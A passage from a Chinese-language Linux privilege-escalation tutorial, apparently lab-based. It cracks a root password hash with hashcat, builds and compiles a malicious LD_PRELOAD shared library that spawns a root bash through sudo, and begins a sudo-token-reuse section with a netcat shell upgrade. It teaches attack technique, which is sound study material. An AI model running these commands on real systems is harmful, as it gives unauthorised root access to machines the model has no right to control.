<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">hashcat -m 1800 ./root_hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt -o root_cracked</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517190030751-691036037-dc76c374539411f68e1a69f6f9be4cc4.png" width="716" height="304" class="img_ev3q"></p>
<p>在短短 8 秒内，hashcat 就能够破解root哈希并恢复密码。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517190030764-1984451313-5121fd814ea52a419d2998cdcf46317b.png" width="873" height="63" class="img_ev3q"></p>
<p>现在我们可以将此密码带回给受害者并<strong>su root</strong>来提升我们的权限！</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">su root</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517190030101-1713245842-c05af6f54b149ff601361bab91981abd.png" width="390" height="93" class="img_ev3q"></p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="3利用-sudo-命令--ld_preload-注入"><strong><div id="id3">3、利用 Sudo 命令 – LD_PRELOAD 注入</div></strong><a href="#3利用-sudo-命令--ld_preload-注入" class="hash-link" aria-label="3利用-sudo-命令--ld_preload-注入的直接链接" title="3利用-sudo-命令--ld_preload-注入的直接链接">​</a></h2>
<p><strong>LD_PRELOAD</strong> 也称为预加载，是 Linux 动态链接器中的一项强大且高级的功能，它允许用户将共享对象文件注入（预加载）到进程的地址空间中（在进程开始执行之前）。</p>
<p>作为攻击者，我们可以通过将我们自己的恶意预加载库注入到任何可以使用<strong>sudo</strong>权限运行的二进制文件中来利用此功能。</p>
<blockquote>
<p>注意：这需要能够编辑 LD_PRELOAD 环境变量。如果您收到以下错误：“sudo: sorry, you are not allowed to set the following environment variables: LD_PRELOAD”，那么这将不起作用。</p>
</blockquote>
<p>通过创建恶意预加载库，我们将强制命令在执行实际命令之前预加载（执行）我们的库。</p>
<p>首先，我们需要制作恶意库。</p>
<p>这可以通过编写和编译以下简单的 C 程序来完成：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">#include &lt;stdio.h&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#include &lt;sys/types.h&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#include &lt;stdlib.h&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">void _init() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        unsetenv(&quot;LD_PRELOAD&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        setgid(0);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        setuid(0);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        system(&quot;/bin/bash&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>由于我们有完整的 TTY，因此我们可以直接在受害者机器上使用文本编辑器编辑文本。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517190030832-613409244-d680c27a78060ee2b87dbbda032f73f2.png" width="325" height="204" class="img_ev3q"></p>
<p>现在我们已经创建了恶意的<strong>inject.c</strong>共享库文件，我们需要将其编译成共享对象。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">gcc -fPIC -shared -nostartfiles inject.c -o inject.so</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517190030497-1797931717-eceb91b2b56f45231198e6e769403f1d.png" width="805" height="171" class="img_ev3q"></p>
<p>Perfect！我们的共享库已准备就绪。</p>
<p>之前，我们看到一些二进制文件没有为我们提供直接的 root shell：<strong>bzip2、dd</strong>和<strong>apache2</strong> ，幸运的是，我们可以利用我们创建的恶意共享对象文件来注入这3个二进制文件中的任何一个，或任何其他我们可以使用<strong>sudo</strong>运行二进制文件以获得 root shell。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sudo LD_PRELOAD=/home/cain/inject.so /usr/sbin/apache2</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517190030584-1865128999-15abd298a68dfe363fbe8771a193a8b2.png" width="659" height="76" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517190030366-1060588243-2771effbf8d7aa1325bd940d4e525547.png" width="602" height="76" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517190030825-1069661300-7907377637bd6ba94ff1249269aaba1b.png" width="580" height="75" class="img_ev3q"></p>
<p>Amazing！因为我们能够设置 LD_PRELOAD 变量，所以我们可以轻松地从任何可以使用<strong>sudo</strong>运行的二进制文件中获取root shell ！</p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="4利用-sudo-命令--sudo-令牌重用"><strong><div id="id4">4、利用 Sudo 命令 – Sudo 令牌重用</div></strong><a href="#4利用-sudo-命令--sudo-令牌重用" class="hash-link" aria-label="4利用-sudo-命令--sudo-令牌重用的直接链接" title="4利用-sudo-命令--sudo-令牌重用的直接链接">​</a></h2>
<p><strong>sudo</strong>不仅是一个二进制文件、组和特权，它还是一个令牌！</p>
<p>虽然它并不是真正的令牌，但它已经被标记化了，因为它可以记住状态（距离上次使用已有多长时间）。</p>
<p>当我们使用<strong>sudo</strong>运行命令时，它通常会提示输入当前用户的密码。提供密码后，系统会创建一个令牌，该令牌会记住该密码 15 分钟。这允许用户多次使用sudo而无需不断输入密码。</p>
<p>尽管这是一个有用的功能，但如果条件合适的话，它也有其漏洞。</p>
<p>在这个例子中，我们将从用户<strong>cain</strong>出发，假装我们已经作为用户<strong>juggernaut</strong>在目标上获得了立足点。</p>
<p>另外，假设我们通过利用 Web 应用程序漏洞获得了立足点，因此我们目前不知道用户密码。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517190031158-68429410-d3243b3f8fe4c8d5987123c3d49c3dc8.png" width="956" height="167" class="img_ev3q"></p>
<p>从这篇文章的第 1 部分中，我们看到<strong>juggernaut</strong>位于<strong>sudo</strong>组中，这意味着该用户可以使用<strong>sudo</strong>运行任何命令--只要默认配置没有更改即可。</p>
<p>这也意味着我们需要知道用户的密码才能使用<strong>sudo</strong>运行命令。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="41shell-升级--完整-tty"><strong><div id="id4.1">4.1、Shell 升级 – 完整 TTY</div></strong><a href="#41shell-升级--完整-tty" class="hash-link" aria-label="41shell-升级--完整-tty的直接链接" title="41shell-升级--完整-tty的直接链接">​</a></h4>
<p>由于这个 shell 不是使用 SSH 创建的，因此我们获得立足点后要做的第一件事就是将 shell 升级为完整的 TTY。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;);&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">CTRL + Z         #backgrounds netcat session</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">stty raw -echo</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fg               #brings netcat session back to the foreground</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">export TERM=xterm</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517190030749-1646359475-9b559547e4b9c380ec4cce137c52251e.png" width="581" height="174" class="img_ev3q"></p>
<p>现在我们有了完整的 TTY，就可以使用上下键浏览命令历史记录、使用tab键补全命令、clear命令清屏等。</p>
<blockquote>
<p>此步骤对于本示例来说是必要的，因为<strong>sudo</strong>会提示输入密码，而只有在拥有完整的 TTY 时我们才能看到该密码。</p>
</blockquote>
<p>现在我们有完整的 TTY，运行<strong>sudo -l</strong>，我们可以看到我们需要用户的密码才能使用<strong>sudo</strong>。</p>
<p><img decoding="async" loading="lazy" src="data:image/png;base64,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